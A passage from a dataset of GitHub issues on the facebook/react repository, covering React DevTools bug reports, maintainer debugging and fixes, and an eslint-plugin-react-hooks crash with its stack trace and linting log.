all.\r\n\r\nthank you for responding @bvaughn "}, {"author": "bvaughn", "body": "@muhfs94 I appreciate the extra information, but this isn't a description that I can use to reproduce (and fix) the bug. I need an actual website (or code) that I can run along with instructions (like \"do this, then this\") so I can see the bug."}, {"author": "HillLiu", "body": "@bvaughn \r\nThere are some simple code could help reproduce.\r\n\r\nYou could try following code sandbox link.\r\nhttps://jkk1y.csb.app/\r\n\r\nThe reproduce steps are:\r\n1. \"Do not\" open develop panel. \r\n2. Go to https://jkk1y.csb.app/\r\n3. Open develop panel and go to react dev tab.\r\n4.  Errors was shown.\r\n\r\nI guess it's kind of race condition. \r\nWhen I change the component order such as \r\n```     \r\n     <PageLoadProgressHandler />\r\n    <PopupPool />\r\n```\r\nIt will work perfect.\r\n\r\n```\r\nimport React from 'react'; \r\nimport {PopupPool} from 'organism-react-popup';\r\nimport {PageLoadProgressHandler} from 'organism-react-progress'; \r\n\r\nconst Index = (props)=>\r\n<>\r\n    <PopupPool />\r\n    <PageLoadProgressHandler />\r\n</>\r\n\r\nexport default Index;\r\n```\r\n\r\nPs: brief explain what component do.\r\nThe PageLoadProgressHandler will dispatch float element to PopupPool."}, {"author": "bvaughn", "body": "Excellent! Thank you, @HillLiu \r\n\r\nSuper interesting that this bug only occurs if you _wait_ to open DevTools until _after_ the page has loaded."}, {"author": "HillLiu", "body": "> \r\n> Super interesting that this bug only occurs if you _wait_ to open DevTools until _after_ the page has loaded.\r\n\r\nI think it is because only have two components, I have two sites, one it will always happen, another will random happen.\r\n\r\nor maybe code-sandbox do some strange things."}, {"author": "bvaughn", "body": "This is interesting. The reason DevTools throws is that the `Progress` Fiber's _owner_ (the `_debugOwner` attribute) points to a `Body` Fiber that hasn't been mounted yet. That seems unexpected.\r\n\r\nThis repro is just a wrapper around two NPM packages. Where's the source code for these packages? :D\r\n\r\n**Edit** I found it, although there's _a lot of indirection here_. Tracing one package which imports another which imports another. Would be helpful if it were flattened \ud83d\ude01  but I guess I can always step through the bundled source."}, {"author": "HillLiu", "body": "> This repro is just a wrapper around two NPM packages. Where's the source code for these packages? :D\r\n\r\nPopupPool:\r\nhttps://github.com/react-atomic/react-atomic-organism/blob/master/packages/organism-react-popup/ui/organisms/PopupPool.jsx\r\n\r\nPageLoadProgressHandler:\r\nhttps://github.com/react-atomic/react-atomic-organism/blob/master/packages/organism-react-progress/ui/organisms/PageLoadProgressHandler.jsx\r\n\r\nGood luck... XD.\r\n\r\n\r\n"}, {"author": "bvaughn", "body": "Interestingly, if I copy the `PopupPool`, `popupStore`, and `popupDispatcher` source files into the sandbox (and only change the import statement in `App`) the bug goes away. That's surprising."}, {"author": "bvaughn", "body": "I wonder if I'm running slightly different code? The debug log shows a slightly different tree structure. Is the version of the source you linked me to the same as the one the Sandbox points to in NPM, @HillLiu?\r\n\r\n**Edit** Looks like the repro is using 0.18.8 (released a couple of months ago) but the latest NPM release is 0.11.1. That being said, it doesn't look like the files that are being imported have changed (at least not in source) so I'm still not sure what's up."}, {"author": "HillLiu", "body": "@bvaughn I change two main components to hook style then get better performance, it reduce the error happen, but I still could get error.  Some error is happen after component render done and open the panel same behavior with pervious.\r\n\r\nPageLoadProgressHandler.jsx \r\nhttps://github.com/react-atomic/react-atomic-organism/commit/49b1c6eea8a2908c3480ebfacfa7a1a8ed1ec8da#diff-d039b6298f0db5bc41a63cde66ce18c16cfec603aff6fffae91487e9b8f67764\r\n\r\nDisplayPopupEl.jsx\r\nhttps://github.com/react-atomic/react-atomic-organism/commit/f11978153b93c2e8a3a980efa2012ddf2465c6c6#diff-1432f1411d92e61abcafccadda54bb5881460d891e548fe5bf58e0d0191143da\r\n\r\nI'll log my changes in following issue ticket.\r\nhttps://github.com/react-atomic/react-atomic-organism/issues/300\r\n"}, {"author": "bvaughn", "body": "Would be nice to get a smaller reproduction of this issue (all of the code in one project, rather than spread across many NPM packages). That's what I was trying to do with moving the source but then the bug goes away b'c the code seems to be different.\r\n\r\nI noticed one potential difference being the `\"reshow-runtime/helpers/interopRequireDefault\"` indirection but I'm not sure how likely that is to be related."}, {"author": "bvaughn", "body": "Looking at the error while debugging, it looks like the [render method of `Body` creates a `Progress` element during render and assigns it to `this._bar`](https://github.com/react-atomic/react-atomic-organism/blob/5e54e71eb191c76cd6447a394427832cfa51ae81/packages/organism-react-progress/ui/organisms/PageLoadProgressHandler.jsx#L132-L145), then either renders it _or_ dispatches a popup event to show it.\r\n\r\nI'm not sure why (too sleepy to think it through maybe) but sometimes `Progress` seems to be mounting _before_ `Body` has, which goes against an assumption in DevTools. Will dig back in tomorrow."}, {"author": "bvaughn", "body": "@HillLiu I really appreciate the repro case, but there are *so many layers of indirection* between the various NPM packages being used to dynamically create the components. It's difficult to trace through.\r\n\r\nI'm going to hand this issue to you and ask for a smaller repro case. (Without 10+ NPM projects that each require each other.) Is this something you can help with?\r\n\r\n**Edit** I _fixed_ this (#21562) but the test case I added is not great since it relies on unsupported side effects to trigger the problem case. I'd still love to get a smaller repro so I can (1) be sure I fully fixed the problem and (2) add a regression case so it doesn't get re-introduced."}, {"author": "bvaughn", "body": "Bugfix released as [version 4.13.5](https://github.com/facebook/react/blob/master/packages/react-devtools/CHANGELOG.md#4135-may-25-2021)"}, {"author": "mamedium", "body": "thank you @bvaughn fixed on version 4.13.5 \ud83d\udc4d"}, {"author": "HillLiu", "body": "@bvaughn Thanks your effort.\r\n\r\nYour fixed also be success from my side."}, {"author": "minaairsupport", "body": "if you are using store like redux or redux toolkit make sure you activate \ndev tools that way \n```\nconst composeWithDevTools =\n  window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose\n```\nor\n`devTools: true,`"}]}
{"repo": "facebook/react", "issue_number": 25874, "issue_url": "https://github.com/facebook/react/issues/25874", "issue_title": "[DevTools Bug]: Unsupported hook in the react-debug-tools package: Missing method in Dispatcher: origHooks", "issue_author": "IvanBuljovcic", "issue_body": "### Website or app\n\nhttps://ny.tess.no/\n\n### Repro steps\n\nError in _all_ components that use any built in React hook.\r\n![image](https://user-images.githubusercontent.com/5270514/207038916-188aac17-0879-4b2e-b88a-cb649dedbbdf.png)\r\n\r\nIssue is present only when running development build of React.\r\n\r\nReact version `16.12.0`\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n_No response_\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n_No response_", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "mondaychen", "body": "If it's only present on development mode, I'm not able to reproduce this issue easily -- the link you out there is a prod website. Is it possible to create a repro on something I can see such as codesandbox?"}, {"author": "Aashutosh-kr", "body": "This issue came when I tried to view the component with the useFormState hook in it.\r\nThe warning states to update React Devtools, so I removed it and installed it again, but the issue persists.\r\n![image](https://github.com/facebook/react/assets/95764284/dc457a2b-a68c-421a-a93a-fe610c43524d)\r\n"}, {"author": "alexander-densley", "body": "+1 getting the same issue\r\n"}, {"author": "genthegreat", "body": "Getting the same issue"}, {"author": "hoxyq", "body": "React DevTools should support all built-in hooks now, also experimental and unstable ones. If you are seeing this error, please reopen the issue, specifying the unsupported built-in hook."}]}
{"repo": "facebook/react", "issue_number": 29194, "issue_url": "https://github.com/facebook/react/issues/29194", "issue_title": "[DevTools Bug]: Getting Component Tree from my code", "issue_author": "CH1NRU5T", "issue_body": "### Website or app\n\nhttps://github.com/facebook/react/issues/22540\n\n### Repro steps\n\nGreetings,\r\nI am trying to get the component tree ( that react dev-tools show in the extension ) in my own code, and I want to send it to backend API server using an HTTP POST request.\r\nAny idea on how I can achieve this?\r\nI looked at using `__REACT_DEVTOOLS_GLOBAL_HOOK__` but no luck yet.\r\n\r\nThank you\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n_No response_\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n_No response_", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "This is probably out of date, but will write an explanation for posterity.\n\n> I am trying to get the component tree in my own code\n\nThere is no programmatic API for it in React DevTools at the moment, and we don't have plans for it. Even if there would be one, this would be dev-only, hence not that useful.\n\nIf you are just hacking, you can try injecting into React DevTools global hook and then traversing the Fiber tree manually, which I strongly suggest to avoid doing in production."}]}
{"repo": "facebook/react", "issue_number": 32257, "issue_url": "https://github.com/facebook/react/issues/32257", "issue_title": "[DevTools Bug]:  [DevTools Bug] Minified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings.", "issue_author": "najeebWorld", "issue_body": "### Website or app\n\nwebsite \n\n### Repro steps\n\ntrying to catch the component using react dev tools\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\nreact-devtools-extensions\n\n### DevTools version (automated)\n\n6.1.0-b000019578\n\n### Error message (automated)\n\nMinified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings.\n\n### Error call stack (automated)\n\n```text\nat trackUsedThenable (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:45359)\n    at useThenable (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:49037)\n    at Object.use (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:49258)\n    at t.use (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:240881)\n    at ActualSourceButton (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1389072)\n    at renderWithHooks (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:47208)\n    at updateFunctionComponent (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:84514)\n    at beginWork (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:98436)\n    at performUnitOfWork (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:167733)\n    at workLoopSync (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:167590)\n```\n\n### Error component stack (automated)\n\n```text\nat ActualSourceButton (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1388949)\n    at Suspense (<anonymous>)\n    at Components_InspectedElementViewSourceButton (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1389400)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at InspectedElementWrapper (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1389911)\n    at InspectedElementContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1347917)\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1334647)\n    at div (<anonymous>)\n    at InspectedElementErrorBoundaryWrapper (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1340957)\n    at NativeStyleContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1373326)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at OwnersListContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1287112)\n    at SettingsModalContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1316397)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1412929\n    at va (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1334647)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1337358)\n    at chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1337555\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at div (<anonymous>)\n    at ThemeProvider (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1337358)\n    at TimelineContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1414942)\n    at ProfilerContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1406733)\n    at TreeContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1228907)\n    at SettingsContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1256772)\n    at ModalDialogContextController (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1394425)\n    at DevTools_DevTools (chrome-extension://fmkadmapgofadopljbjfkapdkoienihi/build/main.js:1:1563309)\n```\n\n### GitHub query string (automated)\n\n```text\nhttps://api.github.com/search/issues?q=Minified React error #482; visit https://react.dev/errors/482 for the full message or use the non-minified dev environment for full errors and additional helpful warnings. in:title is:issue is:open is:public label:\"Component: Developer Tools\" repo:facebook/react\n```", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Fixed in 6.1.1."}]}
{"repo": "facebook/react", "issue_number": 27752, "issue_url": "https://github.com/facebook/react/issues/27752", "issue_title": "[DevTools Bug]: React devtool is not there in codesandbox", "issue_author": "iamayushdas", "issue_body": "### Website or app\n\nhttps://codesandbox.io/p/sandbox/white-fog-2pjd7p\n\n### Repro steps\n\nI was following the react.dev docs\r\nI was at tic tac toe chapter and doing my code stuff in codesandbox as per document\r\n\r\ni triggered an issue that react devtools is not there in code sandbox\r\n<img width=\"754\" alt=\"Screenshot 2023-11-28 at 9 25 29\u202fAM\" src=\"https://github.com/facebook/react/assets/40708551/5d83861d-426b-4326-93ad-40a2927d8228\">\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n_No response_\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n_No response_", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "iamayushdas", "body": "Its resolved closing now\r\nThanks @wasimtikki1220"}, {"author": "happyeungin", "body": "@iamayushdas I still can't find it, where do you find it?"}, {"author": "JustLikeThis101", "body": "+1 can't find it either @iamayushdas "}, {"author": "voidao", "body": "+1 can't find it, please help!"}, {"author": "LucaM0nt", "body": "How is this solved? There's not React devtool anywhere now? I don't get it..."}, {"author": "lixinjie520", "body": "I can't find it either\uff0chelp plsssss!!!"}, {"author": "byerancy", "body": "+1, can't find it."}, {"author": "Daembius", "body": "I can't find it either. Do I need to install an extension to my browser or something?"}, {"author": "Splooples", "body": "I also have this exact problem. "}, {"author": "BARIKORDOR", "body": "I also have the same problem.. Help please"}, {"author": "gillianbc", "body": "Same for me - how do I display the tools?"}, {"author": "bertcornelissen", "body": "Same for me.... No DevTools"}, {"author": "Mehdji", "body": "Same problem..."}, {"author": "Plafalavah", "body": "Same here. No DevTools"}, {"author": "BeiHaiSTAR", "body": "Same, where is the Devtools ?"}, {"author": "Aayush974", "body": "anyone found out where it is yet?\r\n"}, {"author": "devavratravetkar", "body": "I'm not sure how to integrate React DevTools within the CodeSandBox online coding environment.\nHowever, you can do the following steps to use it in the React Tic-Tac-Toe Tutorial:\n\n1. First install [React Dev Tools chrome extension](https://chromewebstore.google.com/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en).\n2. Your tic-tac-toe preview has a URL similar to \"https://v***v3.csb.app/\"\n3. Simply copy-paste it into a new tab. And open your Chrome DevTools. Now you can see the Square components and their State under the Components tab of DevTools.\n\n![Image](https://github.com/user-attachments/assets/fa754cd3-c35f-4afb-bccb-c689869cd75f)\n\nHope this helps and you can utilize it to understand and complete the rest of the tutorial!"}]}
{"repo": "facebook/react", "issue_number": 20204, "issue_url": "https://github.com/facebook/react/issues/20204", "issue_title": "Bug: eslint-plugin-react-hooks: Cannot read property 'type' of undefined at analyzePropertyChain", "issue_author": "AriPerkkio", "issue_body": "<!--\r\n  Please provide a clear and concise description of what the bug is. Include\r\n  screenshots if needed. Please test using the latest version of the relevant\r\n  React packages to make sure your issue has not already been fixed.\r\n-->\r\n\r\nReact version:\r\n```json\r\n\"react\": \"^16.14.0\"\r\n\"eslint-plugin-react-hooks\": \"^4.2.0\",\r\n```\r\n\r\n## Steps To Reproduce\r\n\r\n1. Lint file with contents below\r\n\r\n```js\r\n// useCustomHook.js\r\nimport { useEffect } from 'react';\r\n\r\nexport function useCustomHook(someObject) {\r\n  useEffect(() => {\r\n    }, [\r\n      someObject?.optionalField.method(),\r\n    ]);\r\n}\r\n```\r\n\r\n```js\r\n// .eslint.rc\r\nmodule.exports = {\r\n    root: true,\r\n    env: {\r\n        es6: true,\r\n    },\r\n    parserOptions: {\r\n        ecmaVersion: 2020,\r\n        sourceType: 'module',\r\n        ecmaFeatures: {\r\n            jsx: true,\r\n        },\r\n    },\r\n    settings: {\r\n        react: {\r\n            version: 'detect',\r\n        },\r\n    },\r\n    plugins: ['react-hooks'],\r\n    extends: [\r\n        'plugin:react-hooks/recommended',\r\n    ],\r\n};\r\n```\r\n\r\n## The current behavior\r\nESlint reports error: `Cannot read property 'type' of undefined Occurred while linting <file>`.\r\nhttps://github.com/facebook/react/blob/13a62feab8c39bc0292eb36d636af0bb4f3a78df/packages/eslint-plugin-react-hooks/src/ExhaustiveDeps.js#L1624-L1625\r\n\r\n## The expected behavior\r\nESlint rule should not crash. According to https://github.com/facebook/react/issues/18819#issuecomment-655151489 optional chaining should be supported.\r\n\r\n\r\nI was testing [an ESLint testing tool](https://github.com/AriPerkkio/eslint-remote-tester) I've been creating and ran into this issue. I can work on a fix for this later if needed. \r\n\r\nHere's the results and log.\r\n\r\n<details>\r\n  <summary>Error result</summary>\r\n\r\n  ## Rule: unable-to-parse-rule-id\r\n- Message: `Cannot read property 'type' of undefined\r\nOccurred while linting <text>:45`\r\n- Path: `elastic/kibana/x-pack/plugins/security_solution/public/detections/containers/detection_engine/rules/use_rules.tsx`\r\n- [Link](https://github.com/elastic/kibana/blob/HEAD/x-pack/plugins/security_solution/public/detections/containers/detection_engine/rules/use_rules.tsx#L45)\r\n```tsx\r\n  const reFetchRules = useRef<(refreshPrePackagedRule?: boolean) => void>(noop);\r\n  const [loading, setLoading] = useState(true);\r\n  const [, dispatchToaster] = useStateToaster();\r\n\r\n  useEffect(() => {\r\n    let isSubscribed = true;\r\n    const abortCtrl = new AbortController();\r\n\r\n    async function fetchData() {\r\n      try {\r\n```\r\n```\r\nTypeError: Cannot read property 'type' of undefined\r\nOccurred while linting <text>:45\r\n    at analyzePropertyChain (/<removed>/eslint-remote-tester/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:2235:12)\r\n    at analyzePropertyChain (/<removed>/eslint-remote-tester/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:2264:20)\r\n    at /<removed>/eslint-remote-tester/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:1297:34\r\n    at Array.forEach (<anonymous>)\r\n    at visitFunctionWithDependencies (/<removed>/eslint-remote-tester/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:1277:43)\r\n    at visitCallExpression (/<removed>/eslint-remote-tester/node_modules/eslint-plugin-react-hooks/cjs/eslint-plugin-react-hooks.development.js:1737:11)\r\n    at /<removed>/eslint-remote-tester/node_modules/eslint/lib/linter/safe-emitter.js:45:58\r\n    at Array.forEach (<anonymous>)\r\n    at Object.emit (/<removed>/eslint-remote-tester/node_modules/eslint/lib/linter/safe-emitter.js:45:38)\r\n    at NodeEventGenerator.applySelector (/<removed>/eslint-remote-tester/node_modules/eslint/lib/linter/node-event-generator.js:254:26)\r\n```\r\n</details>\r\n\r\n<details>\r\n  <summary>Log</summary>\r\n\r\n```\r\nFull log:\r\n[DONE] AriPerkkio/js-framework-playground 0 errors\r\n[DONE] oldboyxx/jira_clone 0 errors\r\n[WARN] Linting cities.ts took 7s at reach/reach-ui/packages/combobox/examples\r\n[WARN] Linting cities.js took 6s at reach/reach-ui/website/src/components\r\n[DONE] reach/reach-ui 0 errors\r\n[DONE] ant-design/ant-design 0 errors\r\n[DONE] StreakYC/react-smooth-collapse 0 errors\r\n[WARN] pmndrs/react-spring crashed: no-useless-constructor\r\n[DONE] pmndrs/react-spring 1 errors\r\n[DONE] AriPerkkio/scrpr 0 errors\r\n[DONE] react-bootstrap/react-bootstrap 0 errors\r\n[DONE] AriPerkkio/suspense-examples 0 errors\r\n[DONE] AriPerkkio/state-mgmt-examples 0 errors\r\n[WARN] withspectrum/spectrum crashed: no-useless-constructor\r\n[DONE] withspectrum/spectrum 1 errors\r\n[DONE] codesandbox/codesandbox-client 0 errors\r\n[WARN] Linting index.js took 40s at mui-org/material-ui/packages/material-ui-icons/src\r\n[WARN] mui-org/material-ui crashed: no-useless-constructor\r\n[DONE] mui-org/material-ui 2 errors\r\n[DONE] reactjs/reactjs.org 0 errors\r\n[DONE] zesty-io/accounts-ui 0 errors\r\n[DONE] zesty-io/design-system 0 errors\r\n[DONE] segmentio/evergreen 0 errors\r\n[DONE] segmentio/ui-box 0 errors\r\n[DONE] kentcdodds/kentcdodds.com 0 errors\r\n[DONE] kentcdodds/react-fundamentals 0 errors\r\n[DONE] kentcdodds/testing-react-apps 0 errors\r\n[DONE] kentcdodds/react-suspense 0 errors\r\n[DONE] kentcdodds/react-hooks 0 errors\r\n[DONE] artsy/force 0 errors\r\n[DONE] kentcdodds/react-performance 0 errors\r\n[DONE] kentcdodds/advanced-react-hooks 0 errors\r\n[DONE] kentcdodds/advanced-react-patterns 0 errors\r\n[DONE] kentcdodds/bookshelf 0 errors\r\n[DONE] kentcdodds/react-testing-library-examples 0 errors\r\n[DONE] kentcdodds/react-testing-library-course 0 errors\r\n[DONE] kentcdodds/learn-react 0 errors\r\n[DONE] kentcdodds/concurrent-react 0 errors\r\n[WARN] Linting material.min.js took 7s at project-bobon/bobonroastprofile/public\r\n[DONE] project-bobon/bobonroastprofile 0 errors\r\n[DONE] gothinkster/react-redux-realworld-example-app 0 errors\r\n[DONE] 1ven/do 0 errors\r\n[DONE] dockunit/platform 0 errors\r\n[DONE] afghl/dribbble-demo 0 errors\r\n[DONE] ismaelgt/english-accents-map 0 errors\r\n[DONE] DevAlien/dripr-ui 0 errors\r\n[DONE] rwieruch/favesound-mobx 0 errors\r\n[DONE] rwieruch/favesound-redux 0 errors\r\n[DONE] skidding/flatris 0 errors\r\n[DONE] feednext/feednext 0 errors\r\n[DONE] pearofducks/foodprocessor 0 errors\r\n[DONE] limichange/flex-editor 0 errors\r\n[DONE] HVF/franchise 0 errors\r\n[DONE] vercel/hyper 0 errors\r\n[DONE] getguesstimate/guesstimate-app 0 errors\r\n[DONE] stevenhauser/i-have-to-return-some-videotapes 0 errors\r\n[DONE] bebraw/invoice-frontend 0 errors\r\n[DONE] gpbl/isomorphic500 0 errors\r\n[DONE] WebbyLab/itsquiz-wall 0 errors\r\n[DONE] docker/kitematic 0 errors\r\n[DONE] KrateLabs/KrateLabs-App 0 errors\r\n[DONE] afghl/dribble-demo 0 errors\r\n[DONE] zeit/hyper 0 errors\r\n[DONE] koodilehto/invoice-frontend 0 errors\r\n[DONE] insin/lifequote 0 errors\r\n[DONE] paulhoughton/mortgage 0 errors\r\n[DONE] paulhoughton/mortgage-mobx 0 errors\r\n[DONE] browniefed/pdxlivebus 0 errors\r\n[WARN] Linting jquery.js took 9s at Khan/perseus/lib\r\n[WARN] skidding/illustrated-algorithms failed to pull\r\n[DONE] skidding/illustrated-algorithms 0 errors\r\n[WARN] Linting kas.js took 9s at Khan/perseus/lib\r\n[WARN] Linting katex.js took 8s at Khan/perseus/lib/katex\r\n[WARN] Linting less.js took 11s at Khan/perseus/lib\r\n[WARN] Linting mathquill-basic.js took 8s at Khan/perseus/lib/mathquill\r\n[WARN] Linting raphael.js took 7s at Khan/perseus/lib\r\n[DONE] guyellis/plant 0 errors\r\n[DONE] benoitvallon/react-native-nw-react-calculator 0 errors\r\n[WARN] Linting react-with-addons.js took 22s at Khan/perseus/lib\r\n[DONE] insin/react-hn 0 errors\r\n[DONE] LeoAJ/react-iTunes-search 0 errors\r\n[WARN] FormidableLabs/react-music crashed: no-useless-constructor\r\n[DONE] FormidableLabs/react-music 1 errors\r\n[DONE] echenley/react-news 0 errors\r\n[WARN] Linting vendors.min.js took 27s at lkazberova/react-photo-feed/static\r\n[DONE] lkazberova/react-photo-feed 0 errors\r\n[DONE] Khan/perseus 0 errors\r\n[DONE] pl12133/react-solitaire 0 errors\r\n[WARN] Linting bundle.js took 18s at afonsopacifer/react-pomodoro/app\r\n[DONE] afonsopacifer/react-pomodoro 0 errors\r\n[DONE] chvin/react-tetris 0 errors\r\n[DONE] web-pal/react-trello-board 0 errors\r\n[DONE] fcsonline/react-transmission 0 errors\r\n[DONE] SKempin/reactjs-tmdb-app 0 errors\r\n[DONE] fullstackreact/react-yelp-clone 0 errors\r\n[DONE] hoppula/refire-forum 0 errors\r\n[WARN] Linting bootstrap.min.js took 8s at antoinejaussoin/retro-board/retro-board-app/public/marketing/js\r\n[DONE] ritoplz/ritoplz 0 errors\r\n[DONE] andrewngu/sound-redux 0 errors\r\n[DONE] antoinejaussoin/retro-board 0 errors\r\n[DONE] FormidableLabs/spectacle 0 errors\r\n[DONE] torontojs/torontojs.com 0 errors\r\n[DONE] sprintly/sprintly-ui 0 errors\r\n[WARN] captbaritone/winamp2-js crashed: no-useless-constructor\r\n[DONE] captbaritone/winamp2-js 1 errors\r\n[DONE] Automattic/wp-calypso 0 errors\r\n[DONE] marmelab/react-admin 0 errors\r\n[DONE] reactstrap/reactstrap 0 errors\r\n[DONE] palantir/blueprint 0 errors\r\n[DONE] Semantic-Org/Semantic-UI-React 0 errors\r\n[DONE] grommet/grommet 0 errors\r\n[DONE] rebassjs/rebass 0 errors\r\n[DONE] FortAwesome/react-fontawesome 0 errors\r\n[WARN] microsoft/fluentui crashed: no-useless-constructor\r\n[DONE] chakra-ui/chakra-ui 0 errors\r\n[WARN] reakit/reakit crashed: no-useless-constructor\r\n[DONE] reakit/reakit 1 errors\r\n[DONE] rsuite/rsuite 0 errors\r\n[WARN] Linting Calendar.js took 26s at primefaces/primereact/src/components/calendar\r\n[DONE] uber/baseweb 0 errors\r\n[DONE] couds/react-bulma-components 0 errors\r\n[DONE] kulakowka/react-bulma 0 errors\r\n[DONE] dfee/rbx 0 errors\r\n[WARN] Linting index.ts took 13s at microsoft/fluentui/packages/react-icons-mdl2/src\r\n[DONE] primefaces/primereact 0 errors\r\n[DONE] fibo/trunx 0 errors\r\n[DONE] knipferrc/tails-ui 0 errors\r\n[DONE] emortlock/tailwind-react-ui 0 errors\r\n[DONE] geist-org/react 0 errors\r\n[WARN] Linting List.tsx took 8s at microsoft/fluentui/packages/react-internal/src/components/List\r\n[DONE] brillout/awesome-react-components 0 errors\r\n[WARN] Linting react-datepicker.js took 16s at elastic/eui/packages\r\n[DONE] JedWatson/react-select 0 errors\r\n[DONE] atlassian/react-beautiful-dnd 0 errors\r\n[DONE] react-dnd/react-dnd 0 errors\r\n[DONE] strml/react-grid-layout 0 errors\r\n[DONE] microsoft/fluentui 1 errors\r\n[DONE] adazzle/react-data-grid 0 errors\r\n[DONE] tannerlinsley/react-table 0 errors\r\n[WARN] elastic/eui crashed: no-useless-constructor\r\n[DONE] mzabriskie/react-draggable 0 errors\r\n[DONE] strml/react-resizable 0 errors\r\n[DONE] bokuweb/react-resizable-and-movable 0 errors\r\n[DONE] elastic/eui 1 errors\r\n[DONE] axmz/react-searchbox-awesome 0 errors\r\n[DONE] bokuweb/react-resizable-box 0 errors\r\n[DONE] bokuweb/react-sortable-pane 0 errors\r\n[DONE] aeagle/react-spaces 0 errors\r\n[DONE] Hacker0x01/react-datepicker 0 errors\r\n[WARN] Linting DayPickerRangeController_spec.jsx took 8s at airbnb/react-dates/test/components\r\n[DONE] orgsync/react-list 0 errors\r\n[DONE] airbnb/react-dates 0 errors\r\n[WARN] Linting bundle.js took 45s at intljusticemission/react-big-calendar/examples\r\n[DONE] intljusticemission/react-big-calendar 0 errors\r\n[DONE] i18next/react-i18next 0 errors\r\n[DONE] davidtheclark/react-aria-modal 0 errors\r\n[WARN] Linting test262-main.ts took 10s at yahoo/react-intl/packages/intl-listformat\r\n[WARN] Linting app.js took 18s at glortho/react-keydown/example/public/js\r\n[DONE] glortho/react-keydown 0 errors\r\n[WARN] Linting test262-main.ts took 7s at yahoo/react-intl/packages/intl-numberformat\r\n[DONE] gilbarbara/react-joyride 0 errors\r\n[DONE] greena13/react-hotkeys 0 errors\r\n[DONE] bvaughn/react-window 0 errors\r\n[WARN] text-mask/text-mask crashed: no-useless-constructor\r\n[WARN] Linting test262-main.ts took 41s at yahoo/react-intl/packages/intl-relativetimeformat\r\n[DONE] yahoo/react-intl 0 errors\r\n[DONE] bvaughn/react-virtualized 0 errors\r\n[DONE] dvtng/react-loading-skeleton 0 errors\r\n[DONE] KyleAMathews/react-spinkit 0 errors\r\n[DONE] zpao/qrcode.react 0 errors\r\n[DONE] airbnb/rheostat 0 errors\r\n[DONE] pierpo/react-archer 0 errors\r\n[WARN] Linting bundle.js took 23s at text-mask/text-mask/website/static\r\n[DONE] text-mask/text-mask 1 errors\r\n[DONE] mkosir/react-parallax-tilt 0 errors\r\n[DONE] rackt/react-autocomplete 0 errors\r\n[DONE] 